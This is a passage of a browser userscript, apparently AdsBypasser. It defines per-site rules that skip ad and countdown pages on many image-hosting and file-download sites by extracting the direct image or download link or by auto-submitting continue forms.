    $.removeNodes('iframe');
    var i = $('#img');
    $.openImage(i.src);
  },
});
(function () {
  'use strict';
  function helper (doReplace) {
    if ($.window.confirmAge) {
      $.window.confirmAge(1);
      return;
    }
    var i = $('#container-home img[onclick]');
    $.openImage(i.src, {
      replace: doReplace,
    });
  }
  $.register({
    rule: {
      host: [
        /^img(fantasy|leech|\.pornleech|smile|nemo|sense|curl)\.com$/,
        /^(imagedomino|lovechix|imagebic)\.com$/,
        /^0img\.net$/,
        /^daily-img\.com$/,
        /^picangel\.in$/,
        /^bunnyforum\.org$/,
      ],
      query: /^\?[pv]=/,
    },
    ready: _.P(helper, false),
  });
  $.register({
    rule: {
      host: /^imgsay\.com$/,
      query: /^\?[pv]=/,
    },
    ready: _.P(helper, true),
  });
})();
$.register({
  rule: {
    host: /^imglocker\.com$/,
    path: [
      /^(\/\w+)\/(.+)\.html$/,
      /^(\/\w+)\/(.+)$/,
    ],
  },
  start: function (m) {
    'use strict';
    var url = _.T('//img.imglocker.com{0}_{1}');
    $.openImage(url(m.path[1], m.path[2]));
  },
});
$.register({
  rule: {
    host: [
      /^imgnova\.xyz$/,
      /^www\.hentai-hot\.xyz$/,
      /^www\.hentai-king\.online$/,
    ],
    path: /^\/i\/.+\.php$/,
    query: /f=(.+)$/,
  },
  start: function (m) {
    'use strict';
    $.openImage('f/' + m.query[1]);
  },
});
(function () {
  'use strict';
  var PATH_RULE = /^\/([0-9a-zA-Z]+)(\.|\/|$)/;
  $.register({
    rule: {
      host: [
        /^img(universal|paying|mega|zeus|monkey|trex|ve|dew|diamond)\.com$/,
        /^(www\.)?imgsee\.me$/,
        /^img(click|maid)\.net$/,
        /^(uploadrr|imageeer|imzdrop|www\.uimgshare|pic-maniac|hulkimge)\.com$/,
        /^imgdrive\.co$/,
        /^cuteimg\.cc$/,
        /^img(tiger|gold)\.org$/,
        /^myimg\.club$/,
        /^foxyimg\.link$/,
        /^(core|iron)img\.net$/,
      ],
      path: PATH_RULE,
    },
    ready: function (m) {
      helper(m.path[1], getNext1);
    },
  });
  $.register({
    rule: {
      host: [
        /^imgview\.net$/,
        /^img(maze|outlet)\.com$/,
      ],
      path: PATH_RULE,
    },
    ready: function () {
      var i = $.$('img.pic');
      if (i) {
        $.openImage(i.src);
        return;
      }
      var d = $('div[id^="imageviewi"]');
      waitDOM(d, function (node) {
        return node.nodeName === 'FORM' && $.$('input[name="id"]', node);
      }).then(function (node) {
        node.submit();
      }).catch(function (e) {
        _.warn(e);
      });
    },
  });
  $.register({
    rule: {
      host: /^img(rock|town)\.net$/,
      path: PATH_RULE,
    },
    ready: function () {
      var i = $.$('img.pic');
      if (i) {
        $.openImage(i.src);
        return;
      }
      getAmbiguousForm('td:nth-child(2) > center > div[id]').then(function (node) {
        node.submit();
      }).catch(function (e) {
        _.warn(e);
      });
    },
  });
  $.register({
    rule: {
      host: /^imgoutlet\.co$/,
      path: PATH_RULE,
    },
    ready: function () {
      var i = $.$('img.pic');
      if (i) {
        $.openImage(i.src);
        return;
      }
      getAmbiguousForm('.inner > center > div[id]').then(function (node) {
        node.submit();
      }).catch(function (e) {
        _.warn(e);
      });
    },
  });
  $.register({
    rule: {
      host: /^chronos\.to$/,
      path: PATH_RULE,
    },
    ready: function (m) {
      helper(m.path[1], getNext2);
    },
  });
  $.register({
    rule: {
      host: /^imgfiles\.org$/,
      path: PATH_RULE,
    },
    ready: function (m) {
      var i = $.$('img.pic');
      if (i) {
        $.openImage(i.src);
        return;
      }
      var f = $('form');
      f.submit();
    },
  });
  $.register({
    rule: 'http://imgview.net/tpind.php',
    ready: function () {
      var i = $.$('img.pic');
      if (i) {
        $.openImage(i.src, {replace: true});
        return;
      }
      _.wait(500).then(function () {
        var d = $('div[id^="imageviewi"] input[type="submit"][style=""]');
        d = d.parentNode;
        d.submit();
      });
    },
  });
  $.register({
    rule: /^http:\/\/imgdragon\.com\/(getfil\.php|dl)$/,
    ready: function () {
      var i = $.$('img.pic');
      if (i) {
        $.openImage(i.src);
        return;
      }
      _.wait(500).then(function () {
        var f = $('#ContinueFRM');
        f.submit();
      });
    },
  });
  function waitDOM (element, fn) {
    return _.D(function (resolve, reject) {
      var observer = new MutationObserver(function (mutations) {
        mutations.forEach(function (mutation) {
          if (mutation.type !== 'childList') {
            return;
          }
          var result = _.C(mutation.addedNodes).find(function (child) {
            return fn(child) ? child : _.none;
          });
          if (!result) {
            return;
          }
          observer.disconnect();
          resolve(result.payload);
        });
      });
      observer.observe(element, {
        childList: true,
      });
    });
  }
  function getAmbiguousForm (selector) {
    var d = $(selector);
    var visibleClasses = null;
    return waitDOM(d, function (node) {
      if (node.nodeName === 'STYLE') {
        visibleClasses = parseStyle(node);
        return false;
      }
      if (node.nodeName === 'FORM' && node.offsetParent !== null) {
        return visibleClasses.some(function (class_) {
          var isVisible = node.classList.contains(class_);
          if (!isVisible) {
            return false;
          }
          var button = $.$('input[type="submit"]', node);
          if (!button) {
            return false;
          }
          return button.style.display !== 'none';
        });
      }
      return false;
    });
  }
  function parseStyle (style) {
    style = style.textContent;
    var pattern = /\.(\w+)\{visibility:initial;\}/g;
    var rv = null;
    var classes = [];
    while ((rv = pattern.exec(style)) !== null) {
      classes.push(rv[1]);
    }
    return classes;
  }
  function go (id, pre, next) {
    $.openLink('', {
      post: {
        op: 'view',
        id: id,
        pre: pre,
        next: next,
        adb: '0',
      },
    });
  }
  function getNext1 (i) {
    return i.value;
  }
  function getNext2 (i) {
    var next = i.onclick && i.onclick.toString().match(/value='([^']+)'/);
    if (next) {
      next = next[1];
      return next;
    } else {
      return i.value;
    }
  }
  function helper (id, getNext) {
    var recaptcha = $.$('#recaptcha_widget, #captcha');
    if (recaptcha) {
      _.info('stop because recaptcha');
      return;
    }
    var i = $.$('input[name="next"]');
    if (i) {
      var next = getNext(i);
      go(id, $('input[name="pre"]').value, next);
      return;
    }
    i = $.$('img.pic');
    if (i) {
      $.openImage(i.src);
      return;
    }
    _.info('do nothing');
  }
})();
$.register({
  rule: {
    host: /^(imgsure|picexposed)\.com$/,
  },
  ready: function () {
    'use strict';
    var i = $('img.pic');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://imgtheif.com/image/*.html',
  ready: function () {
    'use strict';
    var a = $('div.content-container a');
    $.openImage(a.href);
  },
});
$.register({
  rule: {
    host: /^imgtorrnt\.in$/,
    path: /^\/view\.php$/,
    query: /^\?id=.*/,
  },
  ready: function () {
    'use strict';
    var img = $('center div table.tg tbody tr td center img');
    $.openImage(img.src);
  },
});
$.register({
  rule: {
    host: /^imgvault\.pw$/,
    path: /^\/view-image\//,
  },
  ready: function () {
    'use strict';
    var a = $('article div.span7 a[target="_blank"]');
    $.openImage(a.href);
  },
});
$.register({
  rule: 'http://ipic.su/?page=img&pic=*',
  ready: function () {
    'use strict';
    var i = $('#fz');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^javcity\.com$/,
  },
  ready: function () {
    'use strict';
    var a = $('.entry-content > h1:nth-child(1) > a:nth-child(1)');
    var url = a.onclick.toString();
    url = url.match(/window\.open\('([^']+)'\)/);
    if (!url) {
      _.info('pattern changed')
      return;
    }
    $.openImage(url[1]);
  },
});
$.register({
  rule: {
    host: /^keptarolo\.hu$/,
    path: /^(\/[^\/]+\/[^\/]+\.jpg)$/,
  },
  start: function (m) {
    'use strict';
    $.openImage('http://www.keptarolo.hu/kep' + m.path[1]);
  },
});
$.register({
  rule: {
    host: /^lostpic\.net$/,
    query: /^\?photo=\d+$/,
  },
  ready: function () {
    'use strict';
    var i = $('img.notinline.circle');
    $.openImage(i.src);
  },
});
(function () {
  'use strict';
  function helper (m) {
    $.openImage('/images/' + m.query[1]);
  }
  $.register({
    rule: {
      host: [
        /^(hentai-hosting|miragepics|funextra\.hostzi|imgrex|cdn\.javtotal|img3x)\.com$/,
        /^bilder\.nixhelp\.de$/,
        /^imagecurl\.(com|org)$/,
        /^imagevau\.eu$/,
        /^img\.deli\.sh$/,
        /^img(dream|soo|nm|silo)\.net$/,
        /^imgsicily\.it$/,
        /^www\.imghere\.net$/,
      ],
      path: /^\/viewer\.php$/,
      query: /file=([^&]+)/,
    },
    start: helper,
  });
  $.register({
    rule: {
      host: [
        /^(dwimg|imgsin)\.com$/,
        /^www\.pictureshoster\.com$/,
      ],
      path: /^\/viewer\.php$/,
      query: /file=([^&]+)/,
    },
    start: function (m) {
      $.openImage('/files/' + m.query[1]);
    },
  });
  $.register({
    rule: {
      host: [
        /^img(nip|central|cream)\.com$/,
        /^imageview\.me$/,
        /^244pix\.com$/,
        /^postimg\.net$/,
      ],
      path: /^\/viewerr.*\.php$/,
      query: /file=([^&]+)/,
    },
    start: helper,
  });
  $.register({
    rule: [
      'http://www.overpic.net/viewer.php?file=*',
    ],
    ready: function () {
      var i = $('#main_img');
      $.openImage(i.src);
    },
  });
  $.register({
    rule: {
      host: /^dumppix\.com$/,
      path: /^\/viewer\.php$/,
      query: /file=([^&]+)/,
    },
    start: function (m) {
      $.openImage('/images/' + m.query[1], {
        referer: true,
      });
    },
  });
  $.register({
    rule: {
      host: /^xxxhost\.me$/,
      path: /^\/viewer\d+\.php$/,
      query: /file=([^&]+)/,
    },
    start: function (m) {
      $.openImage('files/' + m.query[1]);
    },
  });
})();
$.register({
  rule: {
    host: /^www\.mrjh\.org$/,
    path: /^\/gallery\.php$/,
    query: /^\?entry=(.+)$/,
  },
  ready: function (m) {
    'use strict';
    var url = m.query[1];
    $.openImage('/' + url);
  },
});
$.register({
  rule: {
    host: /^www\.noelshack\.com$/
  },
  ready: function () {
    var i = $('#elt_to_aff');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://pic-money.ru/*.html',
  ready: function () {
    'use strict';
    var f = document.forms[0];
    var sig = $('input[name="sig"]', f).value;
    var pic_id = $('input[name="pic_id"]', f).value;
    var referer = $('input[name="referer"]', f).value;
    var url = _.T('/pic.jpeg?pic_id={pic_id}&sig={sig}&referer={referer}');
    $.openImage(url({
      sig: sig,
      pic_id: pic_id,
      referer: referer,
    }));
  },
});
$.register({
  rule: 'http://www.pic-upload.de/view-*.html',
  ready: function () {
    'use strict';
    $.removeNodes('.advert');
    var i = $('img.preview_picture_2b, img.original_picture_2b');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^pic(2profit|p2)\.com$/,
  },
  ready: function () {
    'use strict';
    var i = $('form > #d1 ~ input[name=bigimg]');
    $.openImage(i.value);
  },
});
$.register({
  rule: {
    host: /^pic(4|5)you\.ru$/
  },
  ready: function () {
  if ($.$('#d1 > img') != null) {
    var URLparams = location.href.split("/", 5);
    var next = URLparams[0] + '/' + URLparams[1] + '/' + URLparams[2] + '/' + URLparams[3] + '/' + URLparams[4] + '/1/';
    $.setCookie('p4yclick','1');
    $.openLink(next);
  } else {
    var i = $('#d1 img').src;
    $.openImage(i);
  }
  },
});
$.register({
  rule: {
    host: /^(www\.)?piccash\.net$/
  },
  ready: function () {
  var i = $('.container > img');
  var m =i.onclick.toString().match(/mshow\('([^']+)'\);/);
  $.openImage(m[1]);
  },
});
$.register({
  rule: [
    'http://amateurfreak.org/share-*.html',
    'http://amateurfreak.org/share.php?id=*',
    'http://images.maxigame.by/share-*.html',
    'http://picfox.org/*',
    'http://www.euro-pic.eu/share.php?id=*',
    'http://www.gratisimage.dk/share-*.html',
    'http://xxx.freeimage.us/share.php?id=*',
    'http://npicture.net/share-*.html',
    'http://www.onlinepic.net/share.php?id=*',
    'http://www.pixsor.com/share.php?id=*',
    'http://www.pixsor.com/share-*.html',
    'http://pixsor.com/XXX/share-*.html',
    'http://holdthemoan.net/x/share-*.html',
    'http://imgurx.net/x/share-*.html',
    'http://www.imgz.pw/share-*.html',
  ],
  ready: function () {
    'use strict';
    var o = $('#iimg');
    $.openImage(o.src);
  },
});
$.register({
  rule: 'http://picmoe.net/d.php?id=*',
  ready: function () {
    'use strict';
    var i = $('img');
    $.openImage(i.src);
  },
});
$.register({
  rule: [
    'http://pics-money.ru/allpicfree/*',
    'http://www.pics-money.ru/allimage/*',
  ],
});
$.register({
  rule: {
    host: /^pics-money\.ru$/,
    path: /^\/v\.php$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var i = $('center img:not([id])');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^www\.pics-money\.ru$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var i = $('#d1 img');
    i = i.onclick.toString();
    i = i.match(/mshow\('(.+)'\)/);
    i = i[1];
    $.openImage(i);
  },
});
$.register({
  rule: 'http://picshare.geenza.com/pics/*',
  ready: function () {
    'use strict';
    var i = $('#picShare_image_container');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^picstream\.tv$/,
    path: /^\/.*\/.*\.html$/,
  },
  ready: function () {
    'use strict';
    var img = $('#view1 > div:nth-child(1) > img:nth-child(1)');
    $.openImage(img.src);
  },
});
$.register({
  rule: {
    host: /^(www\.)?pimpandhost\.com$/,
    path: /^\/image\//,
  },
  ready: function () {
    'use strict';
    var a = $('#image_original');
    var el = document.createElement('div');
    el.innerHTML = a.value;
    var img = $('img', el);
    $.openImage(img.src);
  },
});
$.register({
  rule: {
    host: /^pixhub\.eu$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe, .adultpage, #FFN_Banner_Holder');
    var i = $('.image-show img');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^(www\.)?pixroute\.com$/
  },
  ready: function () {
    'use strict';
    var o = $('.fr4me > div:nth-child(20) > a:nth-child(1) > img:nth-child(1)');
    $.openImage(o.src);
  },
});
$.register({
  rule: {
    host: /^www\.pixsense\.net$/,
    path: /^\/site\/v\/\d+$/,
  },
  ready: function () {
    'use strict';
    var a = $('#myUniqueImg').parentNode;
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^pixxxels\.org$/,
  },
  ready: function () {
    'use strict';
    var img = $.$('#main-image');
    $.openImage(img.dataset.full);
  },
});
$.register({
  rule: {
    host: /^www\.pornimagex\.com$/,
    path: /^\/image\/.*$/,
  },
  ready: function () {
    'use strict';
    var img = $('#fixed img.border2px');
    $.openImage(img.src);
  },
});
$.register({
  rule: {
    host: /^prntscr\.com$/
  },
  ready: function () {
    'use strict';
    var i = $('#screenshot-image');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^pronpic\.org$/,
  },
  ready: function () {
    'use strict';
    var urlBaseImg = $('table.new_table2:nth-child(1) img.link');
    var baseUrl = urlBaseImg.src.split('th_')[0];
    var img = $('table.new_table2:nth-child(2) img.link');
    var url = baseUrl + img.src.split('th_')[1];
    $.openImage(url);
  },
});
$.register({
  rule: {
    host: /^(qrrro|greenpiccs)\.com$/,
    path: /^(\/images\/.+)\.html$/,
  },
  start: function (m) {
    'use strict';
    $.openImage(m.path[1]);
  },
});
$.register({
  rule: {
    host: /^radikal\.ru$/,
    path: /^\/big\//,
  },
  ready: function () {
    'use strict';
    var i = $.$('.base-page_center > div:nth-child(2) > img:nth-child(1)');
    $.openImage(i.src);
  },
});
(function () {
  'use strict';
  function action (firstSelector, secondSelector) {
    $.removeNodes('iframe, #adblock_detect, .popupOverlay');
    var node = $.$(firstSelector);
    if (node) {
      _.wait(500).then(function () {
        node.removeAttribute('disabled');
        return _.wait(500);
      }).then(function () {
        node.focus();
        node.click();
        node.click();
        node.click();
      });
      return;
    }
    var i = $(secondSelector);
    $.openImage(i.src);
  }
  var defaultAction = _.P(action, '#continuetoimage > form input', 'img[class^=centred]');
  $.register({
    rule: [
      {
        host: [
          /^image(ontime|corn|picsa|horse|decode)\.com$/,
          /^(zonezeed|zelje|croft|myhot|bok|hostur|greasy|dam)image\.com$/,
          /^img(icy|next|savvy|\.spicyzilla|twyti|xyz|devil|tzar|ban|pu|beer|wet|tornado|kicks|nimz|binbou|2share|22|cover|hit|main|trial|blank|reputa|fapper|reality)\.com$/,
          /^(i\.)?imgseeds?\.com$/,
          /^img-(zone|planet|pay|uploads)\.com$/,
          /^www\.img(blow|lemon|4sharing)\.com$/,
          /^www\.imagefolks\.com$/,
          /^www\.freephotohostin\.com$/,
          /^(www\.)?imgult\.com$/,
          /^xxx(imagenow|screens)\.com$/,
          /^xxxsparrow?\.com$/,
          /^(playimg|picstwist|ericsony|wpc8|uplimg|lexiit|thumbnailus|newimagepost|fapingpics|dimtus|tinizo)\.com$/,
          /^((i|hentai)\.)?imgslip\.com$/,
          /^(i|xxx)\.hentaiyoutube\.com$/,
          /^(go|er)imge\.com$/,
          /^(like\.)?08lkk\.com$/,
          /^nim(plus|zshare)\.com$/,
          /^nudeximg\.com$/,
          /^img(serve|coin|fap|candy|master|-view|run|boom|project|python|pics|pix)\.net$/,
          /^(imagesouls|naughtygate|gallerycloud|imagelaser|picture-bang|project-photo|pix-link|funimg|golfpit|xximg)\.net$/,
          /^(shot|adult)img\.org$/,
          /^image(\.adlock|on|team)\.org$/,
          /^(voyeur|drag|teen|mega)image\.org$/,
          /^teenshot\.org$/,
          /^img(studio|spot)\.org$/,
          /^www\.hotimage\.uk$/,
          /^(hotimages|55888)\.eu$/,
          /^img(cloud|mag)\.co$/,
          /^pixup\.us$/,
          /^(bulkimg|photo-up|myimg|pop-img|img-pop|ads-img)\.info$/,
          /^vava\.in$/,
          /^(pixxx|picspornfree|imgload|fapat)\.me$/,
          /^(domaink|pic2pic|porno-pirat|24avarii|loftlm|18pron|imgplus)\.ru$/,
          /^imgease\.re$/,
          /^goimg\.xyz$/,
          /^(pic2pic|picz)\.site$/,
          /^darpix\.ga$/,
          /^sxpics\.nl$/,
          /^darpix\.desi$/,
          /^pic4you\.top$/,
          /^imgsen\.se$/,
          /^ipicture\.su$/,
          /^acidimg\.cc$/,
        ],
        path: /^\/img-.*\.html/,
      },
      {
        host: [
          /^img(run|twyti)\.net$/,
          /^imgtwyti\.com$/,
          /^hentai-(pop|baka)\.com$/,
          /^star-hentai\.com$/,
          /^(jav|img)-hentai\.host$/,
          /^hentai-king\.host$/,
          /^img-king\.xyz$/,
        ],
        path: /^\/[ti]\/img-.*\.html/,
      },
      {
        host: /^imgking\.co$/,
        path: /^\/img4?-.*\.html/,
      },
      {
        host: /^imgbb\.net$/,
        path: /^\/.-.+$/,
      },
      {
        host: /^cdn\.javtotal\.com$/,
        path: /^\/img\/.+$/,
      },
      {
        host: /^imgtor\.pw$/,
        path: /^\/img2\/.+$/,
      },
      {
        host: /^ima\.gy$/,
        path: /^\/i\/.+$/,
      },
    ],
    ready: defaultAction,
  });
  $.register({
    rule: {
        host: /^imgtor\.pw$/,
        path: /^\/img\/.*$/,
    },
    start: function (m) {
      var imageUrl = 'http://' + m.host[0] + m.path[0].replace("img","img2");
      $.openLink(imageUrl);
    },
  });
  $.register({
    rule: {
      host: /^imgrat\.com$/,
      path: /^\/img-.*\.html/,
    },
    ready: _.P(action, '#close', '#main_image img.center-block.img-responsive'),
  });
  $.register({
    rule: {
      host: [
        /^imageporn\.eu$/,
        /^imgzizi\.xyz$/,
      ],
      path: /^\/img-.*\.html/,
    },
    start: function () {
      $.window.document.createElement = null;
    },
    ready: defaultAction,
  });
  $.register({
    rule: {
      host: [
        /^(www\.)?img(adult|wallet|taxi)\.com$/,
        /^(www\.)?imgdrive\.net$/,
      ],
      path: /^\/img-.*\.html$/,
    },
    start: function () {
      var c = $.getCookie('ibpuc');
      if (c) {
        return;
      }
      $.post(window.location.href.toString(), {
        cti: 1,
        ref: '',
        rc: 1,
        rp: 1,
        bt: 0,
        bw: 'edge',
      }).then(function (data) {
        window.location.reload();
      });
    },
    ready: function () {
      $.removeNodes('iframe');
      var node = $.$('#continuetoimage > form input');
      if (node) {
        node.click();
        node.click();
        return;
      }
      $.resetCookies();
      var i = $('img[class^=centred]');
      $.openImage(i.src);
    },
  });
  function helper () {
    $.window.setTimeout = _.nop;
    return $.get(window.location.toString()).then(function (data) {
      return $.toDOM(data);
    });
  }
  $.register({
    rule: {
      host: /^08lkk\.com$/,
      path: /^\/Photo\/img-.+\.html$/,
    },
    start: function () {
      helper().then(function (page) {
        var i = $('img[class^=centred]', page);
        $.openImage(i.src);
      });
    },
  });
  $.register({
    rule: {
      host: /^08lkk\.com$/,
      path: /^\/\d+\/img-.*\.html$/,
    },
    start: function () {
      helper().then(function (page) {
        var bbcode = $.$('#imagecodes input', page);
        bbcode = bbcode.value.match(/.+\[IMG\]([^\[]+)\[\/IMG\].+/);
        bbcode = bbcode[1];
        bbcode = bbcode.replace('small', 'big');
        $.openImage(bbcode);
      });
    },
  });
  $.register({
    rule: [
      {
        host: /^imgking\.co$/,
        path: /^\/imgs-.*\.html/,
      },
      {
        host: [
          /^img(kings|prime)\.com$/,
          /^imagerar\.com$/,
        ],
        path: /^\/img-.*\.html/,
      },
    ],
    ready: function () {
      var url = $.window.linkid;
      $.openImage(url);
    },
  });
  $.register({
    rule: {
      host: /^imgkings\.com$/,
      path: /^\/img2-.*\.html/,
    },
    ready: defaultAction,
  });
  $.register({
    rule: [
      {
        host: /^imagerar\.com$/,
        path: /^\/img2-/,
      },
      {
        host: /^imgking\.co$/,
        path: /^\/img[v3]-.*\.html/,
      },
      {
        host: /^imgprime\.com$/,
        path: /^\/img3-.*\.html$/,
      },
    ],
    ready: function () {
      var i = $('img[alt]');
      $.openImage(i.src);
    },
  });
  $.register({
    rule: {
      host: /^img\.yt$/,
      path: /^\/img-.*\.html/,
    },
    ready: _.P(action, '#continuebutton, #continuetoimage input[type="submit"]', 'img[class^=centred]'),
  });
})();
$.register({
  rule: 'http://www.subirimagenes.com/*.html',
  ready: function () {
    'use strict';
    var i = $('#ImagenVisualizada');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://tinypic.com/view.php?pic=*',
  ready: function () {
    'use strict';
    var i = $('#imgElement');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^www\.turboimagehost\.com$/,
    path: /^\/p\//,
  },
  ready: function () {
    'use strict';
    var i = $('#imageid');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://vvcap.net/db/*.htp',
  ready: function () {
    'use strict';
    var i = $('img');
    $.openImage(i.src, {
      replace: true,
    });
  },
});
$.register({
  rule: {
    host: /^x\.pixfarm\.net$/,
    path: /^\/sexy\/\d+\/\d+\/.+\.html$/,
  },
  ready: function () {
    'use strict';
    var i = $('img');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^akoam\.com$/,
    path: /^\/download\//,
  },
  start: function () {
    'use strict';
    var location_link = location.hash;
    $.post(location_link).then(function (data) {
      data = JSON.parse(data);
      if (!data.hash_data) {
        _.warn('rule changed');
        return;
      }
      $.openLink(data.direct_link);
    });
  },
});
$.register({
  rule: {
    host: /^www\.anafile\.com$/,
  },
  ready: function () {
    'use strict';
    var b = $.$('#btn_download');
    if (b) {
      b.disabled = false;
      $.removeNodes('div[align=center]');
      return;
    }
    b = $('#plans_free form [type=submit]');
    b.click();
  },
});
$.register({
  rule: {
    host: /^(www\.)?arab\.sh$/,
    path: /^\/\w+$/,
  },
  ready: function () {
    'use strict';
    var f = $('form[name=F1]');
    setTimeout(function() {
        f.submit();
    }, 20000);
  },
});
$.register({
  rule: {
    host: /^(www\.)?coolrom\.com$/,
    path: /^\/dlpop\.php$/,
  },
  ready: function () {
    'use strict';
    var matches = $.searchScripts(/<form method="POST" action="([^"]+)">/);
    $.openLink(matches[1]);
  },
});
(function() {
  'use strict';
  $.register({
    rule: {
      host: /^(www\.)?dl-protect\.com$/,
      path: /\/[A-Z0-9]+/,
    },
    ready: function () {
      if ($.$('#captcha')) {
        return;
      }
      var f = $.$('form[name=ccerure]');
      if (f) {
        var observer = new MutationObserver(function (mutations) {
          var iIn = $('input[id=in]');
          for (var i = 0; i < mutations.length; i++) {
            if (mutations[i].target.value && mutations[i].attributeName === 'value') {
              observer.disconnect();
              iIn.value = "Tracking too much hurts users' privacy";
              if (!canFastRedirect()) {
                return;
              }
              setTimeout(function() {
                f.submit();
              }, 600);
              break;
            }
          }
        });
        var iIn = $('input[id=in]');
        if (iIn.value) {
          setTimeout(function() {
            f.submit();
          }, 600);
        } else {
          observer.observe(iIn, {
            attributes: true,
          });
        }
        return;
      }
      var l = $.$$('#slinks > a');
      if (l.size() === 1) {
        $.openLink(l.at(0).href);
      }
    },
  });
  function canFastRedirect () {
    return !$.$('form[name=ccerure]').onsubmit && !$.$('form[name=ccerure] input[name=pwd]');
  }
})();
$.register({
  rule: {
    host: /^(www\.)?embedupload\.com$/,
    path: /^\/$/,
    query: /^\?\w{2}=\w+$/
  },
  ready: function () {
    'use strict';
    var downloadPage = $('.categories a[target=_blank]');
    $.openLink(downloadPage);
  },
});
$.register({
  rule: {
    host: /^www\.fileproject\.com\.br$/,
    path: /^\/files\/+/,
  },
  ready: function () {
    'use strict';
    var m = $.searchScripts(/<a id="down" href="([^"]+)">/);
    $.openLink(m[1]);
  },
});
$.register({
  rule: {
    host: /^(www\.)?(firedrive|putlocker)\.com$/,
    path: /^\/file\/[0-9A-F]+$/,
  },
  ready: function () {
    'use strict';
    var c = $('#confirm_form');
    c.submit();
  },
});
$.register({
  rule: {
    host: /^iori\.us$/,
  },
  ready: function () {
    'use strict';
    var a = $('#wrapper .tombol a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?jheberg\.net$/,
    path: /^\/captcha\//,
  },
  ready: function () {
    'use strict';
    $('.dl-button').click();
  },
});
$.register({
  rule: {
    host: /^(www\.)?jheberg\.net$/,
    path: /^\/redirect\//,
  },
  ready: function () {
    'use strict';
    $.removeAllTimer();
    var matches = $.searchScripts(/'slug':\s*'([^']+)',\s*'hoster':\s*'([^']+)'/);
    var slug = matches[1];
    var hoster = matches[2];
    $.post('/get/link/', {
      'slug': slug,
      'hoster': hoster
    }).then(function(response) {
      var respJSON = _.parseJSON(response);
      $.openLink(respJSON.url);
    });
  },
});
$.register({
  rule: {
    host: /^(www\.)?larashare\.com$/,
    path: /^\/do\.php$/,
    query: /id=\d+/,
  },
  start: function () {
    'use strict';
    $.openLink(document.location.href.replace('id=','down='));
  },
});
$.register({
  rule: {
    host: /^(www\.)?maxmirror\.com$/,
    path: /^\/redirect\//,
  },
  ready: function () {
    'use strict';
    var l = $('#download_url > a');
    $.openLink(l.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?mirrorcreator\.com$/,
    path: /^\/showurl\.php$/,
  },
  ready: function () {
    'use strict';
    var a = $.$('#redirectlink a');
    if (a) {
      $.openLink(a.href);
      return;
    }
    a = $('#redirectlink > div.redirecturl');
    a = a.innerHTML;
    if (!a.match(/^http/)) {
      throw new _.AdsBypasserError('not a valid URL');
    }
    $.openLink(a);
  },
});
$.register({
  rule: {
    host: /^www\.multiupfile\.com$/,
    path: /^\/f\//,
  },
  ready: function () {
    'use strict';
    var f = $('#yw0');
    f.submit();
  },
});
$.register({
  rule: {
    host: /^mylinkgen\.com$/,
    path: /^\/p\/(.+)$/,
  },
  start: function (m) {
    'use strict';
    $.openLink('/g/' + m.path[1]);
  },
});
$.register({
  rule: {
    host: /^mylinkgen\.com$/,
    path: /^\/g\//,
  },
  ready: function () {
    'use strict';
    var a = $('#main-content a.btn.btn-default');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: [
      /^openload\.co$/,
      /^oload\.tv$/,
    ],
    path: /^\/f\/.*/,
  },
  start: function (m) {
    $.window.adblock = false;
    $.window.adblock2 = false;
    $.window.popAdsLoaded = true;
  },
  ready: function () {
    'use strict';
    setTimeout(function () {
      var timer = $('#downloadTimer');
      timer.style.display = 'none';
      var dlCtn = $('#realdl');
      dlCtn.style.display = 'inline-block';
      var dlBtn = $('a', dlCtn);
      var ePath = $('#streamurl');
      dlBtn.href = "/stream/" + ePath.textContent;
      var videoCtn = $.$('.videocontainer');
      if (videoCtn) {
        var overlay = $('#videooverlay', videoCtn);
        overlay.click();
        dlBtn.addEventListener('click', function (evt) {
          evt.preventDefault();
          var iframe = document.createElement('iframe');
          iframe.src = dlBtn.href;
          document.body.appendChild(iframe);
        });
        _.info(_.T('{0} -> {1}')(window.location, dlBtn.href));
        dlBtn.click();
      } else {
        $.openLink(dlBtn.href);
      }
    }, 500);
  }
});
$.register({
  rule: {
    host: /^(www\.)?upmirror\.info$/,
  },
  ready: function () {
    'use strict';
    $.setCookie('user', 'ppp');
    if ($.$('#countDownText')) {
        $.openLink(document.location.toString());
    }
  },
});
$.register({
  rule: {
    host: /^(www\.)?vidto\.me$/,
  },
  ready: function () {
    'use strict';
    var f = $('#btn_download').form;
    setTimeout(function() {
        f.submit();
    }, 6000);
  },
});
(function () {
  'use strict';
  var sUrl = '(\\b(https?|ftp|file):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])';
  function isLink (text) {
    var rUrl = new RegExp(_.T('^{0}$')(sUrl), 'i');
    return rUrl.test(text);
  }
  function linkify (text) {
    var rUrl = new RegExp(sUrl, 'ig');
    return text.replace(rUrl, function(match) {
      return _.T("<a href='{0}'>{0}</a>")(match);
    });
  }
  $.register({
    rule: {
      host: /^(www\.)?([a-zA-Z0-9]+\.)?binbox\.io$/,
      path: /\/([a-zA-Z0-9]+)/,
      hash: /(?:#([a-zA-Z0-9]+))?/,
    },
    ready: function (m) {
      var sjcl = $.window.sjcl;
      var paste_id = m.path[1];
      var paste_salt = m.hash[1];
      var API_URL = _.T('https://binbox.io/{0}.json')(paste_id);
      $.get(API_URL, false, {
        Origin: _.none,
        Referer: _.none,
        Cookie: 'referrer=1',
        'X-Requested-With': _.none,
      }).then(function (pasteInfo) {
        pasteInfo = _.parseJSON(pasteInfo);
        if (!pasteInfo.ok) {
          throw new _.AdsBypasserError("error when getting paste information");
        }
